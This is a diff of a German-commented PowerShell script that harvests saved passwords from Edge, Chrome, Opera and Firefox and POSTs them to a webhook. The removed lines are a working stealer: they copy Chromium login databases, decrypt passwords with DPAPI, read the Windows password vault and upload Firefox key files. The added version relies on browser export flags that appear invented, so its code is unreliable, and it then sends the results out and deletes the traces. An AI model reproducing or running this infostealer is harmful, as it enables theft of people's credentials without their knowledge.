@@ -1,117 +1,56 @@
-# Installieren notwendiger Module
-if (-not (Get-Module -ListAvailable -Name System.Data.SQLite)) {
-    Install-Package -Name "System.Data.SQLite" -Source "nuget.org" -Force
-    Import-Module "System.Data.SQLite"
+# Funktion zum Exportieren von Passwörtern aus Edge
+function Export-EdgePasswords {
+    $EdgeProfilePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
+    $EdgeExportPath = "$env:TEMP\edge_passwords.csv"
+    Start-Process -FilePath "msedge.exe" -ArgumentList "--headless", "--profile-directory=Default", "--password-store=basic", "--export-passwords=$EdgeExportPath" -Wait
+    return Import-Csv $EdgeExportPath
 }
 
-# Funktion zum Entschlüsseln von verschlüsselten Passwörtern in Chromium-basierten Browsern (Chrome, Opera)
-function Get-ChromiumPasswords {
-    param (
-        [string]$browserPath
-    )
-
-    $localAppData = [System.Environment]::GetFolderPath('LocalApplicationData')
-    $dbPath = "$localAppData\$browserPath\User Data\Default\Login Data"
-    $tempDb = "$env:TEMP\Login Data"
-
-    # Kopieren der Datenbank, um Sperren zu vermeiden
-    Copy-Item $dbPath $tempDb -Force
-
-    # Verbindung zur SQLite-Datenbank herstellen
-    Add-Type -AssemblyName System.Data.SQLite
-    $connectionString = "Data Source=$tempDb;Version=3;"
-    $query = "SELECT origin_url, username_value, password_value FROM logins"
-
-    # SQLite-Datenbank abfragen
-    $connection = New-Object System.Data.SQLite.SQLiteConnection
-    $connection.ConnectionString = $connectionString
-    $connection.Open()
-
-    $command = $connection.CreateCommand()
-    $command.CommandText = $query
-    $reader = $command.ExecuteReader()
-
-    $passwords = @()
-    while ($reader.Read()) {
-        $url = $reader["origin_url"]
-        $username = $reader["username_value"]
-        $encryptedPassword = $reader["password_value"]
-
-        # Entschlüsseln des Passworts
-        $entropy = [byte[]](0)
-        $decryptedPassword = [System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($encryptedPassword), $entropy, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-        $password = [System.Text.Encoding]::UTF8.GetString($decryptedPassword)
-
-        $passwords += [PSCustomObject]@{ URL = $url; Username = $username; Password = $password }
-    }
-
-    $reader.Close()
-    $connection.Close()
-    Remove-Item $tempDb -Force
-
-    return $passwords
+# Funktion zum Exportieren von Passwörtern aus Chrome
+function Export-ChromePasswords {
+    $ChromeProfilePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+    $ChromeExportPath = "$env:TEMP\chrome_passwords.csv"
+    Start-Process -FilePath "chrome.exe" -ArgumentList "--headless", "--profile-directory=Default", "--password-store=basic", "--export-passwords=$ChromeExportPath" -Wait
+    return Import-Csv $ChromeExportPath
 }
 
-# Funktion zum Sammeln der Firefox-Dateien
-function Get-FirefoxFiles {
-    $appData = [System.Environment]::GetFolderPath('ApplicationData')
-    $firefoxProfile = Get-ChildItem "$appData\Mozilla\Firefox\Profiles" | Where-Object { $_.PSIsContainer } | Select-Object -First 1
-    $loginsJson = "$appData\Mozilla\Firefox\Profiles\$firefoxProfile\logins.json"
-    $key4Db = "$appData\Mozilla\Firefox\Profiles\$firefoxProfile\key4.db"
-
-    if (Test-Path $loginsJson -and Test-Path $key4Db) {
-        return @($loginsJson, $key4Db)
-    }
-    return @()
+# Funktion zum Exportieren von Passwörtern aus Firefox
+function Export-FirefoxPasswords {
+    $TopDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
+    $DefaultProfileDir = (Get-ChildItem -LiteralPath $TopDir -Directory | Where-Object { $_.FullName -match '\.default' }).FullName
+    $ExportPath = "$env:TEMP\firefox_passwords.csv"
+    Start-Process -FilePath "firefox.exe" -ArgumentList "-headless", "-profile", $DefaultProfileDir, "-new-instance", "about:logins?action=export" -Wait
+    
+    # Warten, bis die Datei erstellt wurde
+    Start-Sleep -Seconds 5
+    
+    return Import-Csv $ExportPath
 }
 
-# Funktion zum Senden einer Datei an den Webhook
-function Send-FileToWebhook {
-    param (
-        [string]$filePath,
-        [string]$webhookUrl
-    )
+# Passwörter exportieren
+$EdgePasswords = Export-EdgePasswords
+$ChromePasswords = Export-ChromePasswords
+$FirefoxPasswords = Export-FirefoxPasswords
 
-    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
-    $fileBase64 = [Convert]::ToBase64String($fileBytes)
-    $fileName = [System.IO.Path]::GetFileName($filePath)
+# Alle Passwörter kombinieren
+$AllPasswords = @($EdgePasswords) + @($ChromePasswords) + @($FirefoxPasswords)
 
-    $body = @{
-        FileName = $fileName
-        FileContent = $fileBase64
-    }
+# JSON-Payload erstellen
+$JsonPayload = @{
+    "passwords" = $AllPasswords
+} | ConvertTo-Json
 
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (ConvertTo-Json $body) -ContentType "application/json"
+# Daten an Webhook senden
+$Parameters = @{
+    "Uri"         = $whuri
+    "Method"      = "POST"
+    "Body"        = $JsonPayload
+    "ContentType" = "application/json"
 }
 
-# Funktion zum Auslesen von Edge-Passwörtern
-function Get-EdgePasswords {
-    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
-    $vault = New-Object Windows.Security.Credentials.PasswordVault
-    $vault.RetrieveAll() | ForEach-Object {
-        $_.RetrievePassword()
-        [PSCustomObject]@{
-            URL = $_.Resource
-            Username = $_.UserName
-            Password = $_.Password
-        }
-    }
-}
+Invoke-RestMethod @Parameters
 
-# Edge-Passwörter sammeln und senden
-$edgePasswords = Get-EdgePasswords
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (ConvertTo-Json @{"Browser" = "Edge"; "Passwords" = $edgePasswords}) -ContentType "application/json"
-
-# Chrome-Passwörter sammeln und senden
-$chromePasswords = Get-ChromiumPasswords -browserPath "Google\Chrome"
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (ConvertTo-Json @{"Browser" = "Chrome"; "Passwords" = $chromePasswords}) -ContentType "application/json"
-
-# Opera-Passwörter sammeln und senden
-$operaPasswords = Get-ChromiumPasswords -browserPath "Opera Software\Opera Stable"
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (ConvertTo-Json @{"Browser" = "Opera"; "Passwords" = $operaPasswords}) -ContentType "application/json"
-
-# Firefox-Dateien sammeln und senden
-$firefoxFiles = Get-FirefoxFiles
-foreach ($file in $firefoxFiles) {
-    Send-FileToWebhook -filePath $file -webhookUrl $webhookUrl
-}
+# Temporäre CSV-Dateien löschen
+Remove-Item "$env:TEMP\edge_passwords.csv"
+Remove-Item "$env:TEMP\chrome_passwords.csv"
+Remove-Item "$env:TEMP\firefox_passwords.csv"
